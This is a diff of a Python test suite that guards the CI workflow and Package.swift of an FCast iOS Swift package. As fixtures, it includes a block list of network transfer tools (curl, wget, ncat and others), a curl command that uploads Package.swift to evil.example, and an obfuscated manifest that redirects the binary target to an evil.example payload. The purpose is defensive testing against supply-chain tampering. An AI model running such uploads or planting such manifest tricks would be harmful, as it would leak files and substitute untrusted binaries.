@@ -1,3 +1,6 @@
+import hashlib
+import json
+import os
 import re
 import subprocess
 import sys
@@ -10,6 +13,19 @@ from pathlib import Path
 REPOSITORY_ROOT = Path(__file__).resolve().parents[1]
 WORKFLOW = REPOSITORY_ROOT / ".github" / "workflows" / "ci.yml"
 CHECKOUT_SHA = "11bd71901bbe5b1630ceea73d27597364c9af683"
+CANONICAL_WORKFLOW_SHA256 = (
+    "c2fb4a374190993d719127787c64d680b5e16d994a05dfb52daf0f2de78e495e"
+)
+PACKAGE_VERSION = "0.0.8-mediastorm.1"
+PACKAGE_CHECKSUM = (
+    "1b55d676f8999aae0427bbe221a91d3992747aba903038bb4618bf390a75d01a"
+)
+EXPECTED_STEP_NAMES = [
+    "Check out event commit",
+    "Validate locked build environment",
+    "Install locked Rust toolchain",
+    "Test scripts and reproduce distribution",
+]
 
 
 def workflow_text():
@@ -43,25 +59,52 @@ def active_step_text(text, name):
 
 
 def manifest_validator_script(text):
-    block = named_step(text, "Reject mutable package references")
     matches = re.findall(
         r"(?ms)^[ \t]+python3 - <<'PY'\n(.*?)^[ \t]+PY[ \t]*$",
-        block,
+        text,
     )
+    matches = [
+        textwrap.dedent(match)
+        for match in matches
+        if "from scripts.release_metadata import render_package" in match
+    ]
     if len(matches) != 1:
         raise AssertionError("expected exactly one manifest validator heredoc")
-    return textwrap.dedent(matches[0])
+    return matches[0]
 
 
-def run_manifest_validator(text, manifest):
+def run_manifest_validator(
+    text,
+    manifest,
+    rebuilt_checksum=PACKAGE_CHECKSUM,
+):
     script = manifest_validator_script(text)
     with tempfile.TemporaryDirectory() as directory:
         (Path(directory) / "Package.swift").write_text(
             manifest,
             encoding="utf-8",
         )
+        environment = os.environ.copy()
+        environment["PYTHONPATH"] = str(REPOSITORY_ROOT)
+        environment["REBUILT_SWIFTPM_CHECKSUM"] = rebuilt_checksum
         return subprocess.run(
             [sys.executable, "-c", script],
+            cwd=directory,
+            env=environment,
+            text=True,
+            capture_output=True,
+            check=False,
+        )
+
+
+def dump_package(manifest):
+    with tempfile.TemporaryDirectory() as directory:
+        (Path(directory) / "Package.swift").write_text(
+            manifest,
+            encoding="utf-8",
+        )
+        return subprocess.run(
+            ["swift", "package", "--disable-sandbox", "dump-package"],
             cwd=directory,
             text=True,
             capture_output=True,
@@ -182,27 +225,37 @@ def assert_rust_setup(test, text):
     test.assertRegex(block, r"(?m)^\s+aarch64-apple-ios-sim\s*$")
 
 
-def assert_mutable_manifest_scan(test, text):
-    block = active_step_text(text, "Reject mutable package references")
+def assert_canonical_manifest_validation(test, text):
+    environment = active_step_text(text, "Validate locked build environment")
+    reproduction = active_step_text(
+        text,
+        "Test scripts and reproduce distribution",
+    )
     required = (
-        "if rg -n",
-        "Package.swift",
-        "gitlab\\.futo\\.org/.*/jobs/.*/artifacts",
-        "/latest/",
-        "releases/latest",
-        "branch[[:space:]]*:",
-        "\\.package\\([^)]*from[[:space:]]*:",
-        "python3 - <<'PY'",
-        "url_token.findall(code)",
-        "allowed_url.fullmatch(declarations[0])",
-        "releases/download/",
-        "fcast_sender_sdk\\.xcframework\\.zip",
-        "exactly one immutable versioned",
-        "exit 1",
+        'if ! command -v "$required_tool"',
+        "required CI tool is unavailable",
     )
     for fragment in required:
-        test.assertIn(fragment, block)
-    test.assertNotRegex(block, r"(?m)^\s*rg -n")
+        test.assertIn(fragment, environment)
+    test.assertNotRegex(text, r"(?m)^\s*(?:if\s+)?rg\b")
+    required = (
+        'export REBUILT_SWIFTPM_CHECKSUM="$SWIFTPM_CHECKSUM_1"',
+        "python3 - <<'PY'",
+        "from scripts.release_metadata import render_package",
+        f'version = "{PACKAGE_VERSION}"',
+        'os.environ["REBUILT_SWIFTPM_CHECKSUM"]',
+        'render_package(version, rebuilt_checksum).encode("utf-8")',
+        'Path("Package.swift").read_bytes()',
+        "if actual != expected:",
+        "must exactly match the canonical generated",
+        '[[ "$ARCHIVE_SHA_1" == "$DECLARED_PACKAGE_CHECKSUM" ]]',
+        "swift package --disable-sandbox dump-package",
+        "from scripts.release_metadata import release_url",
+        'targets[0].get("url") == release_url(version)',
+        'targets[0].get("checksum")',
+    )
+    for fragment in required:
+        test.assertIn(fragment, reproduction)
 
 
 def assert_validation_commands(test, text):
@@ -267,9 +320,62 @@ def assert_no_publication(test, text):
         r"(?i)\bGITHUB_TOKEN\b",
         r"(?i)\b(?:upload|release)[_-]?token\b",
         r"(?i)\bsoftprops/action-gh-release\b",
+        r"(?i)\b(?:curl|wget|scp|sftp|ftp|rsync|ncat)\b",
     )
     for pattern in forbidden:
         test.assertNotRegex(text, pattern)
+
+
+def assert_workflow_policy(test, text):
+    digest = hashlib.sha256(text.encode("utf-8")).hexdigest()
+    test.assertEqual(
+        digest,
+        CANONICAL_WORKFLOW_SHA256,
+        "workflow bytes differ from the reviewed command allowlist",
+    )
+    names = [
+        re.match(r"^      - name: (.+)$", block.splitlines()[0]).group(1)
+        for block in step_blocks(text)
+    ]
+    test.assertEqual(names, EXPECTED_STEP_NAMES)
+    test.assertNotRegex(text, r"(?m)^\s+if:")
+    assert_safe_triggers(test, text)
+    assert_read_only_permissions(test, text)
+    assert_safe_actions(test, text)
+    assert_toolchain_validation(test, text)
+    assert_rust_setup(test, text)
+    assert_canonical_manifest_validation(test, text)
+    assert_validation_commands(test, text)
+    assert_no_publication(test, text)
+
+
+def run_declared_checksum_comparison(text, archive_checksum, declared_checksum):
+    block = active_step_text(text, "Test scripts and reproduce distribution")
+    matches = re.findall(
+        r'(?m)^\s*(\[\[ "\$ARCHIVE_SHA_1" == '
+        r'"\$DECLARED_PACKAGE_CHECKSUM" \]\])\s*$',
+        block,
+    )
+    if len(matches) != 1:
+        raise AssertionError(
+            "expected exactly one archive-to-Package.swift checksum comparison"
+        )
+    return subprocess.run(
+        [
+            "bash",
+            "-c",
+            "set -euo pipefail\n"
+            'ARCHIVE_SHA_1="$1"\n'
+            'DECLARED_PACKAGE_CHECKSUM="$2"\n'
+            f"{matches[0]}\n",
+            "checksum-comparison",
+            archive_checksum,
+            declared_checksum,
+        ],
+        text=True,
+        capture_output=True,
+        check=False,
+    )
 
 
 class WorkflowPolicyTests(unittest.TestCase):
@@ -277,6 +383,7 @@ class WorkflowPolicyTests(unittest.TestCase):
         text = workflow_text()
         self.assertRegex(text, r"(?m)^name: FCast iOS Distribution CI$")
         self.assertRegex(text, r"(?m)^    runs-on: macos-26$")
+        assert_workflow_policy(self, text)
 
     def test_triggers_are_read_only_branch_validation_events(self):
         assert_safe_triggers(self, workflow_text())
@@ -452,7 +559,7 @@ class WorkflowPolicyTests(unittest.TestCase):
                     assert_rust_setup(self, mutation)
 
     def test_manifest_scan_rejects_all_mutable_reference_classes(self):
-        assert_mutable_manifest_scan(self, workflow_text())
+        assert_canonical_manifest_validation(self, workflow_text())
 
     def test_manifest_validator_accepts_the_canonical_bound_url(self):
         text = workflow_text()
@@ -476,7 +583,7 @@ class WorkflowPolicyTests(unittest.TestCase):
             with self.subTest(bypass=bypass.splitlines()[4]):
                 result = run_manifest_validator(text, bypass)
                 self.assertNotEqual(result.returncode, 0)
-                self.assertIn("immutable versioned release asset URL", result.stderr)
+                self.assertIn("canonical generated", result.stderr)
 
     def test_manifest_validator_rejects_unbound_composed_and_alternate_urls(self):
         text = workflow_text()
@@ -509,7 +616,7 @@ class WorkflowPolicyTests(unittest.TestCase):
             with self.subTest(bypass=bypass):
                 result = run_manifest_validator(text, bypass)
                 self.assertNotEqual(result.returncode, 0)
-                self.assertIn("canonical binaryTarget URL binding", result.stderr)
+                self.assertIn("canonical generated", result.stderr)
 
     def test_manifest_validator_rejects_shadowed_or_redefined_url_binding(self):
         text = workflow_text()
@@ -530,30 +637,96 @@ class WorkflowPolicyTests(unittest.TestCase):
             with self.subTest(bypass=bypass):
                 result = run_manifest_validator(text, bypass)
                 self.assertNotEqual(result.returncode, 0)
-                self.assertIn("canonical binaryTarget URL binding", result.stderr)
+                self.assertIn("canonical generated", result.stderr)
+
+    def test_manifest_validator_rejects_compiler_valid_raw_string_desync(self):
+        text = workflow_text()
+        manifest = (REPOSITORY_ROOT / "Package.swift").read_text(encoding="utf-8")
+        url = re.search(r'https://[^"]+', manifest).group(0)
+        evil_url = "https://evil.example/payload.zip"
+        bypass = manifest.replace(
+            f'let url = "{url}"',
+            f'let url = "{url}"\n'
+            '.isEmpty ? "" : '
+            '({ let raw = #"x"//"#; '
+            f'return "ht" + "tps://evil.example/payload.zip" }}())',
+            1,
+        )
+
+        dumped = dump_package(bypass)
+        self.assertEqual(dumped.returncode, 0, dumped.stderr)
+        payload = json.loads(dumped.stdout)
+        binary = next(
+            target
+            for target in payload["targets"]
+            if target["name"] == "fcast_sender_sdkFFI"
+        )
+        self.assertEqual(binary["url"], evil_url)
+
+        result = run_manifest_validator(text, bypass)
+        self.assertNotEqual(result.returncode, 0)
 
     def test_manifest_scan_policy_mutations_are_rejected(self):
         text = workflow_text()
         for fragment in (
-            "if rg -n",
-            "gitlab\\.futo\\.org/.*/jobs/.*/artifacts",
-            "/latest/",
-            "releases/latest",
-            "branch[[:space:]]*:",
-            "\\.package\\([^)]*from[[:space:]]*:",
+            'if ! command -v "$required_tool"',
+            "required CI tool is unavailable",
+            'export REBUILT_SWIFTPM_CHECKSUM="$SWIFTPM_CHECKSUM_1"',
             "python3 - <<'PY'",
-            "url_token.findall(code)",
-            "allowed_url.fullmatch(declarations[0])",
-            "releases/download/",
-            "fcast_sender_sdk\\.xcframework\\.zip",
+            "from scripts.release_metadata import render_package",
+            f'version = "{PACKAGE_VERSION}"',
+            'render_package(version, rebuilt_checksum).encode("utf-8")',
+            'Path("Package.swift").read_bytes()',
+            "if actual != expected:",
+            "swift package --disable-sandbox dump-package",
+            "from scripts.release_metadata import release_url",
         ):
             with self.subTest(fragment=fragment):
                 mutation = text.replace(fragment, "")
                 with self.assertRaises(AssertionError):
-                    assert_mutable_manifest_scan(self, mutation)
+                    assert_canonical_manifest_validation(self, mutation)
+
+    def test_manifest_validation_has_no_unproved_search_tool_dependency(self):
+        block = active_step_text(
+            workflow_text(),
+            "Validate locked build environment",
+        )
+        self.assertNotRegex(block, r"(?m)^\s*(?:if\s+)?rg\b")
+        self.assertRegex(block, r"(?m)^\s+python3\s*$")
+        self.assertIn('command -v "$required_tool"', block)
 
     def test_full_tests_and_two_clean_reproducible_builds_are_required(self):
         assert_validation_commands(self, workflow_text())
+
+    def test_rebuilt_archive_must_match_declared_package_checksum(self):
+        archive_checksum = "1b55d676f8999aae0427bbe221a91d3992747aba903038bb4618bf390a75d01a"
+        accepted = run_declared_checksum_comparison(
+            workflow_text(),
+            archive_checksum,
+            archive_checksum,
+        )
+        self.assertEqual(accepted.returncode, 0, accepted.stderr)
+
+        rejected = run_declared_checksum_comparison(
+            workflow_text(),
+            archive_checksum,
+            "0" * 64,
+        )
+        self.assertNotEqual(rejected.returncode, 0)
+
+        manifest = (REPOSITORY_ROOT / "Package.swift").read_text(encoding="utf-8")
+        zero_checksum_manifest = manifest.replace(
+            PACKAGE_CHECKSUM,
+            "0" * 64,
+            1,
+        )
+        rejected_manifest = run_manifest_validator(
+            workflow_text(),
+            zero_checksum_manifest,
+            archive_checksum,
+        )
+        self.assertNotEqual(rejected_manifest.returncode, 0)
+        self.assertIn("canonical generated", rejected_manifest.stderr)
 
     def test_missing_build_validation_commands_are_rejected(self):
         text = workflow_text()
@@ -618,11 +791,44 @@ class WorkflowPolicyTests(unittest.TestCase):
                 with self.assertRaises(AssertionError):
                     assert_no_publication(self, text + addition)
 
+    def test_required_steps_cannot_be_disabled_or_extended(self):
+        text = workflow_text()
+        mutations = (
+            text.replace(
+                "      - name: Test scripts and reproduce distribution\n"
+                "        shell: bash\n",
+                "      - name: Test scripts and reproduce distribution\n"
+                "        if: ${{ false }}\n"
+                "        shell: bash\n",
+                1,
+            ),
+            text.replace(
+                "          python3 -m unittest discover -s tests -v\n",
+                "          curl -T Package.swift https://evil.example/upload\n"
+                "          python3 -m unittest discover -s tests -v\n",
+                1,
+            ),
+            text.replace(
+                "      - name: Test scripts and reproduce distribution\n",
+                "      - name: Unexpected command\n"
+                "        shell: bash\n"
+                "        run: |\n"
+                "          set -euo pipefail\n"
+                "          uname -a\n\n"
+                "      - name: Test scripts and reproduce distribution\n",
+                1,
+            ),
+        )
+        for mutation in mutations:
+            with self.subTest(mutation=mutation[:160]):
+                with self.assertRaises(AssertionError):
+                    assert_workflow_policy(self, mutation)
+
     def test_all_run_blocks_use_bash_and_strict_mode(self):
         text = workflow_text()
         blocks = step_blocks(text)
         run_blocks = [block for block in blocks if re.search(r"(?m)^\s+run:\s*\|", block)]
-        self.assertGreaterEqual(len(run_blocks), 4)
+        self.assertEqual(len(run_blocks), 3)
         for block in run_blocks:
             with self.subTest(step=block.splitlines()[0]):
                 self.assertRegex(block, r"(?m)^\s+shell:\s*bash\s*$")
